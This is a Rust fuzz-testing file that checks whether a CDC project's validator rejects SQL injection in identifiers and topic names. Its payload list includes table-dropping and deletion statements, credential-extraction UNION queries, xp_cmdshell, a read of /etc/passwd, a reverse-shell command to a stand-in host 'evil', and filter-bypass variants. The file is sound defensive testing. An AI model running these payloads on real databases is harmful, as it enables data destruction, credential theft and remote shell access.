#![no_main]
//! Comprehensive SQL injection fuzz testing
//!
//! Tests all inputs that could potentially be used in SQL queries.
//! Ensures the validation layer catches all injection attempts.

use libfuzzer_sys::fuzz_target;
use arbitrary::{Arbitrary, Unstructured};
use rivven_cdc::common::validation::Validator;

/// Structured SQL injection payloads
#[derive(Debug, Clone)]
struct SqlInjectionPayload {
    prefix: String,
    injection: String,
    suffix: String,
}

impl<'a> Arbitrary<'a> for SqlInjectionPayload {
    fn arbitrary(u: &mut Unstructured<'a>) -> arbitrary::Result<Self> {
        let prefixes = [
            "", "valid_", "test", "table_name", "users", "schema", "_private",
        ];
        let injections = [
            "'; DROP TABLE users; --",
            "' OR '1'='1",
            "'; TRUNCATE TABLE users; --",
            "'; DELETE FROM users WHERE '1'='1",
            "UNION SELECT * FROM information_schema.tables--",
            "'; INSERT INTO users VALUES ('hacked', 'password'); --",
            "'; UPDATE users SET password='hacked' WHERE '1'='1; --",
            "; EXEC xp_cmdshell('whoami')--",
            "'; WAITFOR DELAY '0:0:5'--",
            "' AND 1=1--",
            "' AND 1=0 UNION SELECT NULL, username, password FROM users--",
            "'; COPY (SELECT '') TO PROGRAM 'bash -c \"bash -i >& /dev/tcp/evil/1234 0>&1\"'--",
            "pg_sleep(10)--",
            "'; SELECT pg_read_file('/etc/passwd')--",
            "BENCHMARK(1000000,MD5('test'))",
            "SLEEP(5)#",
            "1' AND SLEEP(5)#",
            "' HAVING 1=1--",
            "' GROUP BY columnnames having 1=1--",
            "admin'/*",
            "') OR ('1'='1",
            "' OR 1=1--",
            "' OR 'x'='x",
            "1' ORDER BY 1--",
            "1' ORDER BY 10--",
            "-1' UNION SELECT 1,2,3--",
            "' AND extractvalue(1,concat(0x7e,version()))--",
            "' AND updatexml(1,concat(0x7e,version()),1)--",
            "') AND ('1'='1",
            "') AND ('1'='1'--",
            "' UNION ALL SELECT NULL,NULL,NULL--",
            "1 AND 1=1",
            "1' AND '1'='1",
            "1\" AND \"1\"=\"1",
            "' OR ''='",
            "' OR 1=1#",
            "admin' #",
            "admin'/*",
            "' or 1=1/*",
            "') or '1'='1--",
            "') or ('1'='1--",
            "' OR 'x'='x",
            "1' OR '1'='1",
            "' OR 1=1 LIMIT 1 --",
            "\x00",
            "\x00' OR 1=1--",
            "' OR 1=1\x00--",
        ];
        let suffixes = ["", "_table", "123", "_backup", ";", "--", "/**/"];

        let prefix = prefixes[u.int_in_range(0..=prefixes.len() - 1)?].to_string();
        let injection = injections[u.int_in_range(0..=injections.len() - 1)?].to_string();
        let suffix = suffixes[u.int_in_range(0..=suffixes.len() - 1)?].to_string();

        Ok(SqlInjectionPayload { prefix, injection, suffix })
    }
}

fuzz_target!(|data: &[u8]| {
    // Test with arbitrary payload
    if let Ok(mut u) = Unstructured::new(data).arbitrary::<SqlInjectionPayload>() {
        let payload = format!("{}{}{}", u.prefix, u.injection, u.suffix);
        
        // All of these MUST fail validation
        let identifier_result = Validator::validate_identifier(&payload);
        let topic_parts = format!("cdc.{}.public.table", &payload);
        let topic_result = Validator::validate_topic_name(&topic_parts);
        
        // Verify injections are blocked
        // If the payload contains SQL keywords or special chars, validation SHOULD fail
        if payload.contains(';') || payload.contains("--") || payload.contains("'") 
            || payload.contains('"') || payload.contains("UNION") || payload.contains("SELECT")
            || payload.contains("DROP") || payload.contains("DELETE") || payload.contains("INSERT")
            || payload.contains("UPDATE") || payload.contains("TRUNCATE") {
            // These should always be rejected
            assert!(
                identifier_result.is_err(),
                "SQL injection not blocked for identifier: {}",
                payload
            );
        }
    }

    // Test raw bytes as string
    let raw_string = String::from_utf8_lossy(data);
    let _ = Validator::validate_identifier(&raw_string);

    // Test common bypass techniques
    test_bypass_techniques(&data);
});

fn test_bypass_techniques(data: &[u8]) {
    // Case variation bypass
    let variations = [
        "SeLeCt", "sElEcT", "SELECT", "select",
        "UnIoN", "UNION", "union",
        "DrOp", "DROP", "drop",
    ];
    
    for var in variations {
        let payload = format!("test_{}", var);
        let _ = Validator::validate_identifier(&payload);
    }

    // URL encoding bypass (decoded)
    let url_decoded = [
        "%27", // '
        "%22", // "
        "%3B", // ;
        "%2D%2D", // --
    ];
    
    for encoded in url_decoded {
        let payload = format!("test{}", encoded);
        let _ = Validator::validate_identifier(&payload);
    }

    // Double encoding
    let double_encoded = [
        "%2527", // %27 -> '
        "%253B", // %3B -> ;
    ];
    
    for encoded in double_encoded {
        let payload = format!("test{}", encoded);
        let _ = Validator::validate_identifier(&payload);
    }

    // Whitespace variations
    let whitespace_bypass = [
        "test/**/table",
        "test\ttable",
        "test\ntable",
        "test\rtable",
        "test\x0btable", // vertical tab
        "test\x0ctable", // form feed
    ];
    
    for payload in whitespace_bypass {
        let _ = Validator::validate_identifier(payload);
    }

    // Comment variations
    let comment_bypass = [
        "test--comment",
        "test/*comment*/",
        "test#comment",
        "test;--",
    ];
    
    for payload in comment_bypass {
        let result = Validator::validate_identifier(payload);
        // Should be rejected
        assert!(result.is_err(), "Comment bypass not blocked: {}", payload);
    }
}
